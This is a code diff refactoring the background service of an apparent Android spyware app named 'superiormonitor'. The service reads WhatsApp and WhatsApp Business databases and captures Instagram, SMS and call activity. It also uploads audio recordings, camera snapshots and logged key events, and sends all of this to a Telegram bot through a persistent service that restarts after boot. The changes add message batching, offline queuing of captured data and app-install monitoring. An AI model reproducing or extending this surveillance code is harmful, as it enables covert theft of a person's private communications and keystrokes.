@@ -1,12 +1,13 @@
 package com.system.superiormonitor.bot
 
-import com.system.superiormonitor.util.LogLevel
+import com.system.superiormonitor.core.LogLevel
 
 import android.app.Notification
 import android.app.NotificationChannel
 import android.app.NotificationManager
 import android.app.Service
 import android.content.Context
+import android.content.IntentFilter
 import android.content.Intent
 import android.net.ConnectivityManager
 import android.net.Network
@@ -23,13 +24,17 @@ import com.system.superiormonitor.monitor.WhatsAppMonitor
 import com.system.superiormonitor.monitor.InstagramMonitor
 import com.system.superiormonitor.monitor.SmsMonitor
 
-import com.system.superiormonitor.util.LogCategory
-import com.system.superiormonitor.util.LogManager
-import com.system.superiormonitor.util.TelemetryCollector
+import com.system.superiormonitor.core.LogCategory
+import com.system.superiormonitor.core.LogManager
+import com.system.superiormonitor.core.NetworkRecoveryManager
+import com.system.superiormonitor.core.TelemetryCollector
 import kotlinx.coroutines.*
 import java.io.File
 import java.io.IOException
 import java.net.UnknownHostException
+import java.util.concurrent.ConcurrentHashMap
+import kotlinx.coroutines.sync.Mutex
+import kotlinx.coroutines.sync.withLock
 
 /**
  * Foreground service that runs the Telegram bot polling loop and
@@ -53,19 +58,26 @@ class BotService : Service() {
     private var hasSentBootMessage = false
     private var isFromBoot = false
 
-    private var networkCallback: ConnectivityManager.NetworkCallback? = null
     private var pollingJob: Job? = null
+    private var networkRecoveryManager: NetworkRecoveryManager? = null
     private var whatsAppMonitor: WhatsAppMonitor? = null
-    private var waBusinessMonitor: com.system.superiormonitor.monitor.WABusinessMonitor? = null
+    private var waBusinessMonitor: WhatsAppMonitor? = null
     private var instagramMonitor: InstagramMonitor? = null
     private var callMonitor: CallMonitor? = null
     private var smsMonitor: SmsMonitor? = null
+    
+    private val appInstallReceiver = com.system.superiormonitor.core.AppInstallReceiver()
 
     private val unauthorizedAccessAttempts = object : java.util.LinkedHashMap<String, Int>(50, 0.75f, true) {
         override fun removeEldestEntry(eldest: MutableMap.MutableEntry<String, Int>?): Boolean {
             return size > 50
         }
     }
+
+    // Live Text Batching Properties
+    private val messageBuffers = ConcurrentHashMap<String, MutableList<Pair<String, String?>>>()
+    private val throttleJobs = ConcurrentHashMap<String, Job>()
+    private val sendMutex = Mutex()
 
     companion object {
         const val CHANNEL_ID = "TelegramBotServiceChannel"
@@ -75,6 +87,14 @@ class BotService : Service() {
     override fun onCreate() {
         super.onCreate()
         // DO NOT INITIALIZE NETWORK OR PREFS HERE to comply with Android 14+ strict requirements
+        
+        // Dynamically register AppInstallReceiver to bypass BroadcastQueue restrictions
+        val filter = IntentFilter().apply {
+            addAction(Intent.ACTION_PACKAGE_ADDED)
+            addAction(Intent.ACTION_PACKAGE_REMOVED)
+            addDataScheme("package")
+        }
+        registerReceiver(appInstallReceiver, filter)
     }
 
     override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
@@ -92,47 +112,45 @@ class BotService : Service() {
         }
 
         // ── Dynamic feature toggle actions (no need to restart whole service) ──
-        if (action == "ACTION_UPDATE_WHATSAPP") {
-            handleWhatsAppToggle()
-            return START_STICKY
-        }
-        if (action == "ACTION_UPDATE_WABUSINESS") {
-            handleWABusinessToggle()
-            return START_STICKY
-        }
-        if (action == "ACTION_UPDATE_INSTAGRAM") {
-            handleInstagramToggle()
-            return START_STICKY
-        }
-        if (action == "ACTION_UPDATE_CALL_ALERTS") {
-            handleCallAlertsToggle()
-            return START_STICKY
-        }
-        if (action == "ACTION_UPDATE_SMS_ALERTS") {
-            handleSmsAlertsToggle()
-            return START_STICKY
-        }
-        if (action == "ACTION_UPLOAD_RECORDING") {
-            if (intent != null) handleUploadRecording(intent)
-            return START_STICKY
-        }
-        if (action == "ACTION_UPLOAD_SNAPSHOT") {
-            if (intent != null) handleUploadSnapshot(intent)
-            return START_STICKY
-        }
-        if (action == "ACTION_UPLOAD_KEY_EVENTS") {
-            handleUploadKeyEvents()
-            return START_STICKY
-        }
-        if (action == "ACTION_POPUP_ACKNOWLEDGED") {
-            serviceScope.launch(Dispatchers.IO) {
-                val token = prefsManager?.botToken
-                val chatId = prefsManager?.chatId
-                if (!token.isNullOrBlank() && !chatId.isNullOrBlank()) {
-                    TelegramApi.sendMessage(token, chatId, "✅ *The user has acknowledged and dismissed the popup on the device.*")
-                }
+        when (action) {
+            "ACTION_UPDATE_WHATSAPP" -> {
+                handleMonitorToggle(prefsManager?.whatsappUpdatesEnabled == true, whatsAppMonitor, { startWhatsAppMonitorIfEnabled() }, { whatsAppMonitor?.stop(); whatsAppMonitor = null }, "WhatsApp Monitor")
+                return START_STICKY
             }
-            return START_STICKY
+            "ACTION_UPDATE_WABUSINESS" -> {
+                handleMonitorToggle(prefsManager?.whatsappBusinessUpdatesEnabled == true, waBusinessMonitor, { startWABusinessMonitorIfEnabled() }, { waBusinessMonitor?.stop(); waBusinessMonitor = null }, "WA Business Monitor")
+                return START_STICKY
+            }
+            "ACTION_UPDATE_INSTAGRAM" -> {
+                handleMonitorToggle(prefsManager?.instagramEnabled == true, instagramMonitor, { startInstagramMonitorIfEnabled() }, { instagramMonitor?.stop(); instagramMonitor = null }, "Instagram Monitor")
+                return START_STICKY
+            }
+            "ACTION_UPDATE_CALL_ALERTS" -> {
+                handleMonitorToggle(prefsManager?.callAlertsEnabled == true, callMonitor, { startCallMonitorIfEnabled() }, { callMonitor?.stop(); callMonitor = null }, "Call Monitor")
+                return START_STICKY
+            }
+            "ACTION_UPDATE_SMS_ALERTS" -> {
+                handleMonitorToggle(prefsManager?.smsAlertsEnabled == true, smsMonitor, { startSmsMonitorIfEnabled() }, { smsMonitor?.stop(); smsMonitor = null }, "SMS Monitor")
+                return START_STICKY
+            }
+            "ACTION_UPLOAD_RECORDING" -> {
+                if (intent != null) MediaUploader.handleUploadRecording(this, intent, prefsManager!!)
+                return START_STICKY
+            }
+            "ACTION_UPLOAD_SNAPSHOT" -> {
+                if (intent != null) MediaUploader.handleUploadSnapshot(this, intent, serviceScope, prefsManager!!)
+                return START_STICKY
+            }
+            "ACTION_UPLOAD_KEY_EVENTS" -> {
+                MediaUploader.handleUploadKeyEvents(this, serviceScope, prefsManager!!)
+                return START_STICKY
+            }
+            "ACTION_POPUP_ACKNOWLEDGED" -> {
+                serviceScope.launch(Dispatchers.IO) {
+                    sendToTelegram("✅ *The user has acknowledged and dismissed the popup on the device.*")
+                }
+                return START_STICKY
+            }
         }
 
         // ── Full service startup (Only for null or unknown actions like boot/initial start) ──
@@ -167,7 +185,8 @@ class BotService : Service() {
 
         isFromBoot = intent?.getBooleanExtra("from_boot", false) == true
 
-        registerNetworkCallback()
+        setupNetworkRecoveryManager()
+        networkRecoveryManager?.registerNetworkCallback()
 
         return START_STICKY
     }
@@ -176,203 +195,124 @@ class BotService : Service() {
     //  DYNAMIC FEATURE TOGGLES
     // ═══════════════════════════════════════════════════════════
 
-    private fun handleWhatsAppToggle() {
-        if (prefsManager?.whatsappUpdatesEnabled == true) {
-            if (whatsAppMonitor == null) {
-                startWhatsAppMonitorIfEnabled()
-                LogManager.log(LogCategory.SYSTEM, "WhatsApp Monitor dynamically started.")
+    private fun handleMonitorToggle(isEnabled: Boolean, currentMonitor: Any?, startAction: () -> Unit, stopAction: () -> Unit, name: String) {
+        if (isEnabled) {
+            if (currentMonitor == null) {
+                startAction()
+                LogManager.log(LogCategory.SYSTEM, "$name dynamically started.")
             }
         } else {
-            whatsAppMonitor?.stop()
-            whatsAppMonitor = null
-            LogManager.log(LogCategory.SYSTEM, "WhatsApp Monitor dynamically stopped.")
+            stopAction()
+            LogManager.log(LogCategory.SYSTEM, "$name dynamically stopped.")
         }
     }
 
-    private fun handleWABusinessToggle() {
-        if (prefsManager?.whatsappBusinessUpdatesEnabled == true) {
-            if (waBusinessMonitor == null) {
-                startWABusinessMonitorIfEnabled()
-                LogManager.log(LogCategory.SYSTEM, "WA Business Monitor dynamically started.")
-            }
-        } else {
-            waBusinessMonitor?.stop()
-            waBusinessMonitor = null
-            LogManager.log(LogCategory.SYSTEM, "WA Business Monitor dynamically stopped.")
-        }
+    private fun sendToTelegram(text: String, parseMode: String? = null): Boolean {
+        val chatId = prefsManager?.chatId ?: return false
+        val token = prefsManager?.botToken ?: return false
+        return TelegramApi.sendMessage(token, chatId, text, parseMode = parseMode) != null
     }
 
-    private fun handleInstagramToggle() {
-        if (prefsManager?.instagramEnabled == true) {
-            if (instagramMonitor == null) {
-                startInstagramMonitorIfEnabled()
-                LogManager.log(LogCategory.SYSTEM, "Instagram Monitor dynamically started.")
-            }
-        } else {
-            instagramMonitor?.stop()
-            instagramMonitor = null
-            LogManager.log(LogCategory.SYSTEM, "Instagram Monitor dynamically stopped.")
-        }
-    }
-
-    private fun handleCallAlertsToggle() {
-        if (prefsManager?.callAlertsEnabled == true) {
-            if (callMonitor == null) {
-                startCallMonitorIfEnabled()
-                LogManager.log(LogCategory.SYSTEM, "Call Monitor dynamically started.")
-            }
-        } else {
-            callMonitor?.stop()
-            callMonitor = null
-            LogManager.log(LogCategory.SYSTEM, "Call Monitor dynamically stopped.")
-        }
-    }
-
-    private fun handleSmsAlertsToggle() {
-        if (prefsManager?.smsAlertsEnabled == true) {
-            if (smsMonitor == null) {
-                startSmsMonitorIfEnabled()
-                LogManager.log(LogCategory.SYSTEM, "SMS Monitor dynamically started.")
-            }
-        } else {
-            smsMonitor?.stop()
-            smsMonitor = null
-            LogManager.log(LogCategory.SYSTEM, "SMS Monitor dynamically stopped.")
-        }
-    }
-
-    private fun handleUploadSnapshot(intent: Intent) {
-        val filePath = intent.getStringExtra("filePath") ?: return
-        val tag = intent.getStringExtra("tag") ?: "[SnapshotWorker]"
-        val isSnapshot = intent.getBooleanExtra("isSnapshot", true)
-
-        serviceScope.launch(Dispatchers.IO) {
-            val file = File(filePath)
-            if (!file.exists()) return@launch
-
-            val token = prefsManager?.botToken ?: return@launch
-            val chatId = prefsManager?.chatId ?: return@launch
-
-            val messageText = if (isSnapshot) {
-                BotMessages.MediaOps.buildSnapshotUploadMessage()
-            } else {
-                BotMessages.MediaOps.buildCameraUploadMessage(tag)
-            }
+    private fun handleLiveMessage(source: String, message: String, parseMode: String?, offlineSubdir: String, offlineFileName: String, captionBuilder: () -> String) {
+        val buffer = messageBuffers.getOrPut(source) { mutableListOf() }
+        synchronized(buffer) {
+            buffer.add(Pair(message, parseMode))
             
-            TelegramApi.sendMessage(token, chatId, messageText)
-            delay(3000)
-
-            if (TelegramApi.sendPhoto(token, chatId, file)) {
-                file.delete()
-                LogManager.log(LogCategory.SNAPSHOTS, "$tag Upload successful, local file deleted.")
-            } else {
-                LogManager.log(LogCategory.SNAPSHOTS, "$tag Upload failed. Moving to offline queue.", LogLevel.ERROR)
-                try {
-                    val dateFolder = file.parentFile?.parentFile
-                    if (dateFolder != null) {
-                        val offlineDir = File(dateFolder, "offline")
-                        if (!offlineDir.exists()) offlineDir.mkdirs()
-                        val offlineFile = File(offlineDir, file.name)
-                        file.renameTo(offlineFile)
-                    }
-                } catch (e: Exception) {
-                    LogManager.log(LogCategory.SNAPSHOTS, "$tag Failed to move to offline: ${e.message}", LogLevel.ERROR)
-                }
+            // Safety limit (25 messages)
+            if (buffer.size >= 25) {
+                // Cancel the existing throttle job and process instantly
+                throttleJobs[source]?.cancel()
+                processLiveMessageBuffer(source, offlineSubdir, offlineFileName, captionBuilder)
+                return
             }
         }
-    }
-
-    private fun handleUploadRecording(intent: Intent) {
-        val fileUriString = intent.getStringExtra("fileUri") ?: return
-        val originalPath = intent.getStringArrayExtra("originalPath") ?: emptyArray()
-        val mimeType = intent.getStringExtra("mimeType") ?: "audio/mpeg"
         
-        CoroutineScope(Dispatchers.IO).launch {
-            val fileUri = android.net.Uri.parse(fileUriString)
-            
-            // Log what we received
-            LogManager.log(LogCategory.BASIC_UPDATE, "Received recording for upload: ${originalPath.joinToString("/")}")
-            
-            var originalFileName = originalPath.lastOrNull() ?: "recording.opus"
-            val extension = android.webkit.MimeTypeMap.getSingleton().getExtensionFromMimeType(mimeType)
-            if (extension != null && !originalFileName.endsWith(".$extension")) {
-                originalFileName = "$originalFileName.$extension"
+        if (throttleJobs[source]?.isActive != true) {
+            throttleJobs[source] = serviceScope.launch(Dispatchers.IO) {
+                delay(3000) // 3 seconds wait from first message
+                processLiveMessageBuffer(source, offlineSubdir, offlineFileName, captionBuilder)
             }
-            
-            val caption = BotMessages.MediaOps.buildNewRecordingUploadedMessage(originalFileName)
-            
-            if (TelegramApi.isApiReachable(this@BotService, prefsManager!!.botToken)) {
-                // Upload via bot
-                val result = TelegramApi.sendDocument(
-                    botToken = prefsManager!!.botToken,
-                    chatId = prefsManager!!.chatId,
+        }
+    }
+
+    private fun processLiveMessageBuffer(source: String, offlineSubdir: String, offlineFileName: String, captionBuilder: () -> String) {
+        serviceScope.launch(Dispatchers.IO) {
+            val buffer = messageBuffers.getOrPut(source) { mutableListOf<Pair<String, String?>>() }
+            val messagesToSend = synchronized(buffer) {
+                val copy = buffer.toList()
+                buffer.clear()
+                copy
+            }
+        
+        if (messagesToSend.isEmpty()) return@launch
+        
+        sendMutex.withLock {
+            if (messagesToSend.size <= 3) {
+                // Send individually with 1s delay
+                for ((msg, parseMode) in messagesToSend) {
+                    val success = sendToTelegram(msg, parseMode)
+                    if (!success) {
+                        com.system.superiormonitor.bot.OfflineManager.queueOnly(this@BotService, msg, offlineSubdir, offlineFileName)
+                    }
+                    delay(1000)
+                }
+            } else {
+                // Send as a txt document
+                val combinedText = messagesToSend.joinToString("\n\n--------------------------------------------------\n\n") { it.first }
+                val tempFile = File(cacheDir, "${source}_bulk.txt")
+                try {
+                    tempFile.writeText(combinedText)
+                } catch (e: Exception) {
+                    LogManager.log(LogCategory.BOT_ACTIVITY, "Failed to write bulk text to cache: ${e.message}", LogLevel.ERROR)
+                    com.system.superiormonitor.bot.OfflineManager.queueOnly(this@BotService, combinedText, offlineSubdir, offlineFileName)
+                    return@withLock
+                }
+                
+                val currentPrefs = prefsManager ?: return@withLock
+                val success = MediaUploader.uploadDocument(
                     context = this@BotService,
-                    uri = fileUri,
-                    mimeType = mimeType,
-                    fileName = originalFileName,
-                    caption = caption
+                    token = currentPrefs.botToken,
+                    chatId = currentPrefs.chatId,
+                    file = tempFile,
+                    caption = captionBuilder(),
+                    deleteOnSuccess = true,
+                    fallbackOfflineSubdir = null // We handle fallback manually to append to the standard text log
                 )
                 
-                if (result != null) {
-                    LogManager.log(LogCategory.BASIC_UPDATE, "Successfully uploaded recording: ${originalPath.lastOrNull()}")
-                    com.system.superiormonitor.bot.OfflineManager.moveRecordingToPermanent(this@BotService, fileUriString, originalPath, mimeType)
-                } else {
-                    LogManager.log(LogCategory.BASIC_UPDATE, "Failed to upload recording (API returned null). Left in offline.", LogLevel.ERROR)
+                if (!success) {
+                    // Hand over to offline manager
+                    com.system.superiormonitor.bot.OfflineManager.queueOnly(this@BotService, combinedText, offlineSubdir, offlineFileName)
+                    if (tempFile.exists()) tempFile.delete()
                 }
-            } else {
-                LogManager.log(LogCategory.BASIC_UPDATE, "Telegram unreachable. Left in offline for later sync.")
             }
+        }
         }
     }
 
-    private fun handleUploadKeyEvents() {
-        serviceScope.launch(Dispatchers.IO) {
-            val token = prefsManager?.botToken ?: return@launch
-            val chatId = prefsManager?.chatId ?: return@launch
-            
-            if (!com.system.superiormonitor.bot.TelegramApi.isApiReachable(this@BotService, token)) {
-                return@launch // Network unavailable, retain file in offline queue
-            }
-            
-            val file = java.io.File(getExternalFilesDir(null), "keyevents/offline/offline_keyevents.txt")
-            if (file.exists() && file.length() > 0) {
-                val caption = com.system.superiormonitor.bot.BotMessages.FetchOps.buildRoutineKeyEventsCaption()
-                val success = com.system.superiormonitor.bot.TelegramApi.sendDocument(
-                    token, chatId, this@BotService, android.net.Uri.fromFile(file), "text/plain", file.name, caption
-                ) == true
-                
-                if (success) {
-                    file.delete()
-                    LogManager.log(LogCategory.BASIC_UPDATE, "Key Events uploaded successfully via timer.")
-                } else {
-                    LogManager.log(LogCategory.BASIC_UPDATE, "Failed to upload Key Events via timer. Retained locally.", LogLevel.ERROR)
-                }
-            }
-        }
-    }
+    // ═══════════════════════════════════════════════════════════
+    //  MONITOR LIFECYCLE
+    // ═══════════════════════════════════════════════════════════
 
     private fun startWhatsAppMonitorIfEnabled() {
         if (prefsManager?.whatsappUpdatesEnabled == true) {
             serviceScope.launch(Dispatchers.IO) {
                 if (whatsAppMonitor == null) {
                     // Fail-safe: Verify WhatsApp is installed and database is accessible
-                    if (!WhatsAppMonitor.isWhatsAppInstalled(this@BotService)) {
+                    if (!WhatsAppMonitor.isWhatsAppInstalled(this@BotService, com.system.superiormonitor.monitor.WhatsAppVariant.NORMAL)) {
                         LogManager.log(LogCategory.SYSTEM, "WhatsApp Monitor: WhatsApp is not installed. Disabling toggle.")
                         prefsManager?.whatsappUpdatesEnabled = false
                         return@launch
                     }
-                    val (dbAvailable, dbReason) = WhatsAppMonitor.checkWhatsAppDatabase()
+                    val (dbAvailable, dbReason) = WhatsAppMonitor.checkWhatsAppDatabase(com.system.superiormonitor.monitor.WhatsAppVariant.NORMAL)
                     if (!dbAvailable) {
                         LogManager.log(LogCategory.SYSTEM, "WhatsApp Monitor: $dbReason. Disabling toggle.")
                         prefsManager?.whatsappUpdatesEnabled = false
                         return@launch
                     }
 
-                    whatsAppMonitor = WhatsAppMonitor(this@BotService) { text, parseMode: String? ->
-                        val chatId = prefsManager?.chatId ?: return@WhatsAppMonitor false
-                        val token = prefsManager?.botToken ?: return@WhatsAppMonitor false
-                        val msgId = TelegramApi.sendMessage(token, chatId, text, parseMode = parseMode)
-                        msgId != null
+                    whatsAppMonitor = WhatsAppMonitor(this@BotService, com.system.superiormonitor.monitor.WhatsAppVariant.NORMAL) { text, parseMode ->
+                        handleLiveMessage("whatsapp", text, parseMode, "whatsapp", "offline_whatsapp.txt") { BotMessages.Core.buildBulkUploadMessage("WhatsApp") }
+                        true
                     }
                     LogManager.log(LogCategory.SYSTEM, "WhatsApp Monitor initialized.")
                 }
@@ -386,23 +326,21 @@ class BotService : Service() {
             serviceScope.launch(Dispatchers.IO) {
                 if (waBusinessMonitor == null) {
                     // Fail-safe: Verify WhatsApp Business is installed and database is accessible
-                    if (!com.system.superiormonitor.monitor.WABusinessMonitor.isWhatsAppInstalled(this@BotService)) {
+                    if (!WhatsAppMonitor.isWhatsAppInstalled(this@BotService, com.system.superiormonitor.monitor.WhatsAppVariant.BUSINESS)) {
                         LogManager.log(LogCategory.SYSTEM, "WA Business Monitor: WhatsApp Business is not installed. Disabling toggle.")
                         prefsManager?.whatsappBusinessUpdatesEnabled = false
                         return@launch
                     }
-                    val (dbAvailable, dbReason) = com.system.superiormonitor.monitor.WABusinessMonitor.checkWhatsAppDatabase()
+                    val (dbAvailable, dbReason) = WhatsAppMonitor.checkWhatsAppDatabase(com.system.superiormonitor.monitor.WhatsAppVariant.BUSINESS)
                     if (!dbAvailable) {
                         LogManager.log(LogCategory.SYSTEM, "WA Business Monitor: $dbReason. Disabling toggle.")
                         prefsManager?.whatsappBusinessUpdatesEnabled = false
                         return@launch
                     }
 
-                    waBusinessMonitor = com.system.superiormonitor.monitor.WABusinessMonitor(this@BotService) { text, parseMode: String? ->
-                        val chatId = prefsManager?.chatId ?: return@WABusinessMonitor false
-                        val token = prefsManager?.botToken ?: return@WABusinessMonitor false
-                        val msgId = TelegramApi.sendMessage(token, chatId, text, parseMode = parseMode)
-                        msgId != null
+                    waBusinessMonitor = WhatsAppMonitor(this@BotService, com.system.superiormonitor.monitor.WhatsAppVariant.BUSINESS) { text, parseMode ->
+                        handleLiveMessage("wabusiness", text, parseMode, "wabusiness", "offline_wabusiness.txt") { BotMessages.Core.buildBulkUploadMessage("WhatsApp Business") }
+                        true
                     }
                     LogManager.log(LogCategory.SYSTEM, "WA Business Monitor initialized.")
                 }
@@ -428,11 +366,9 @@ class BotService : Service() {
                         return@launch
                     }
 
-                    instagramMonitor = InstagramMonitor(this@BotService) { text, parseMode: String? ->
-                        val chatId = prefsManager?.chatId ?: return@InstagramMonitor false
-                        val token = prefsManager?.botToken ?: return@InstagramMonitor false
-                        val msgId = TelegramApi.sendMessage(token, chatId, text, parseMode = parseMode)
-                        msgId != null
+                    instagramMonitor = InstagramMonitor(this@BotService) { text, parseMode ->
+                        handleLiveMessage("instagram", text, parseMode, "instagram", "offline_instagram.txt") { BotMessages.Core.buildBulkUploadMessage("Instagram") }
+                        true
                     }
                     LogManager.log(LogCategory.SYSTEM, "Instagram Monitor initialized.")
                 }
@@ -443,11 +379,9 @@ class BotService : Service() {
 
     private fun startCallMonitorIfEnabled() {
         if (prefsManager?.callAlertsEnabled == true && callMonitor == null) {
-            callMonitor = CallMonitor(this) { text, parseMode: String? ->
-                val chatId = prefsManager?.chatId ?: return@CallMonitor false
-                val token = prefsManager?.botToken ?: return@CallMonitor false
-                val msgId = TelegramApi.sendMessage(token, chatId, text, parseMode = parseMode)
-                msgId != null
+            callMonitor = CallMonitor(this) { text, parseMode ->
+                handleLiveMessage("call", text, parseMode, "call", "offline_calls.txt") { BotMessages.Core.buildBulkUploadMessage("Calls") }
+                true
             }
             callMonitor?.start()
         }
@@ -456,11 +390,9 @@ class BotService : Service() {
     private fun startSmsMonitorIfEnabled() {
         if (prefsManager?.smsAlertsEnabled == true) {
             if (smsMonitor == null) {
-                smsMonitor = SmsMonitor(this) { text, parseMode: String? ->
-                    val chatId = prefsManager?.chatId ?: return@SmsMonitor false
-                    val token = prefsManager?.botToken ?: return@SmsMonitor false
-                    val msgId = TelegramApi.sendMessage(token, chatId, text, parseMode = parseMode)
-                    msgId != null
+                smsMonitor = SmsMonitor(this) { text, parseMode ->
+                    handleLiveMessage("sms", text, parseMode, "sms", "offline_sms.txt") { BotMessages.Core.buildBulkUploadMessage("SMS") }
+                    true
                 }
                 smsMonitor?.start()
                 LogManager.log(LogCategory.SYSTEM, "SMS Monitor started.")
@@ -472,101 +404,58 @@ class BotService : Service() {
     //  NETWORK RECOVERY
     // ═══════════════════════════════════════════════════════════
 
-    private fun registerNetworkCallback() {
-        if (networkCallback != null) return
-
-        val connectivityManager = getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
-        networkCallback = object : ConnectivityManager.NetworkCallback() {
-            override fun onAvailable(network: Network) {
-                // Instantly resume WhatsApp Monitor to catch the reconnect message flood
+    private fun setupNetworkRecoveryManager() {
+        if (networkRecoveryManager != null) return
+        networkRecoveryManager = NetworkRecoveryManager(this, serviceScope, object : NetworkRecoveryManager.NetworkCallbacks {
+            override fun onNetworkAvailable() {
                 startWhatsAppMonitorIfEnabled()
                 startWABusinessMonitorIfEnabled()
                 startInstagramMonitorIfEnabled()
-
-                if (pollingJob?.isActive != true) {
-                    LogManager.log(LogCategory.BOT_ACTIVITY, "[NETWORK] Network connection detected. Initiating recovery sequence...")
-                    pollingJob?.cancel()
-                    pollingJob = serviceScope.launch(Dispatchers.IO) {
-                        val token = prefsManager?.botToken
-                        if (token != null) {
-                            LogManager.log(LogCategory.BOT_ACTIVITY, "[NETWORK] Checking Telegram API reachability...")
-                            var attempts = 0
-                            while (TelegramApi.getMe(token) == null) {
-                                attempts++
-                                if (attempts > 30) { // 60 seconds max wait
-                                    LogManager.log(LogCategory.BOT_ACTIVITY, "[NETWORK] Telegram API unreachable. Returning to deep sleep.")
-                                    return@launch
-                                }
-                                delay(2000)
-                            }
-                            LogManager.log(LogCategory.BOT_ACTIVITY, "[NETWORK] Telegram API is reachable!")
-                        }
-
-                        LogManager.log(LogCategory.BOT_ACTIVITY, "[NETWORK] Waiting 5 seconds for network stabilization...")
-                        delay(5000)
-
-                        if (!resolveDnsWithRetries("api.telegram.org")) {
-                            LogManager.log(LogCategory.BOT_ACTIVITY, "[NETWORK] DNS resolution failed after 3 retries. Returning to deep sleep.", LogLevel.ERROR)
-                            return@launch
-                        }
-
-                        LogManager.log(LogCategory.SYSTEM, "DNS resolved. Connection restored. Resuming Telegram polling loop.")
-                        TelegramApi.evictConnections()
-
-                        sendConnectionRestoredNotification()
-                        startPollingLoop()
-                    }
-                }
             }
 
-            override fun onLost(network: Network) {
-                LogManager.log(LogCategory.SYSTEM, "[System] Network offline. Deep sleep mode active.")
-                
-                // Suspend WhatsApp Monitor to save battery
+            override fun onNetworkLost() {
                 whatsAppMonitor?.stop()
                 waBusinessMonitor?.stop()
                 instagramMonitor?.stop()
+            }
 
+            override fun startPollingLoop() {
+                pollingJob?.cancel()
+                pollingJob = serviceScope.launch(Dispatchers.IO) {
+                    this@BotService.startPollingLoop()
+                }
+            }
+
+            override fun stopPollingLoop() {
                 pollingJob?.cancel()
                 pollingJob = null
             }
-        }
-        connectivityManager.registerDefaultNetworkCallback(networkCallback!!)
-    }
 
-    private suspend fun sendConnectionRestoredNotification() {
-        val chatId = prefsManager?.chatId ?: return
-        val token = prefsManager?.botToken ?: return
+            override suspend fun sendConnectionRestoredNotification() {
+                val chatId = prefsManager?.chatId ?: return
+                val token = prefsManager?.botToken ?: return
 
-        val telemetry = TelemetryCollector.gatherTelemetry()
-        val title = BotMessages.Alerts.buildConnectionRestoredMessage()
-        val msg = BotMessages.Core.buildTelemetryMessage(title, telemetry)
-        TelegramApi.sendMessage(token, chatId, msg)
+                val telemetry = TelemetryCollector.gatherTelemetry()
+                val title = BotMessages.Alerts.buildConnectionRestoredMessage()
+                val msg = BotMessages.Core.buildTelemetryMessage(title, telemetry)
+                TelegramApi.sendMessage(token, chatId, msg)
 
-        // Check for offline files using centralized helper
-        com.system.superiormonitor.bot.OfflineManager.processOfflineQueue(this, serviceScope, chatId, null, token)
+                com.system.superiormonitor.bot.OfflineManager.processOfflineQueue(this@BotService, serviceScope, chatId, null, token)
+            }
+
+            override fun isPollingJobActive(): Boolean {
+                return pollingJob?.isActive == true
+            }
+
+            override fun getBotToken(): String? {
+                return prefsManager?.botToken
+            }
+        })
     }
 
     // ═══════════════════════════════════════════════════════════
     //  POLLING LOOP
     // ═══════════════════════════════════════════════════════════
-
-    private suspend fun resolveDnsWithRetries(host: String): Boolean {
-        var delayMs = 5000L
-        while (currentCoroutineContext().isActive && networkCallback != null) {
-            try {
-                withContext(Dispatchers.IO) {
-                    java.net.InetAddress.getByName(host)
-                }
-                return true
-            } catch (e: Exception) {
-                LogManager.log(LogCategory.SYSTEM, "DNS resolution failed. Retrying in ${delayMs / 1000}s...", LogLevel.ERROR)
-                delay(delayMs)
-                if (delayMs < 60000L) delayMs *= 2 // Exponential backoff up to 60s
-            }
-        }
-        return false
-    }
 
     private suspend fun startPollingLoop() {
         LogManager.log(LogCategory.SYSTEM, "Polling loop started...")
@@ -702,6 +591,7 @@ class BotService : Service() {
 
     override fun onDestroy() {
         super.onDestroy()
+        unregisterReceiver(appInstallReceiver)
         whatsAppMonitor?.stop()
         whatsAppMonitor = null
         waBusinessMonitor?.stop()
@@ -716,9 +606,8 @@ class BotService : Service() {
         pollingJob?.cancel()
         serviceJob.cancel()
         networkEnforcer?.stop()
-
-        val connectivityManager = getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
-        networkCallback?.let { connectivityManager.unregisterNetworkCallback(it) }
+        networkRecoveryManager?.unregisterNetworkCallback()
+        networkRecoveryManager = null
 
         LogManager.setServiceRunning(false)
         LogManager.log(LogCategory.SYSTEM, "Service Stopped")
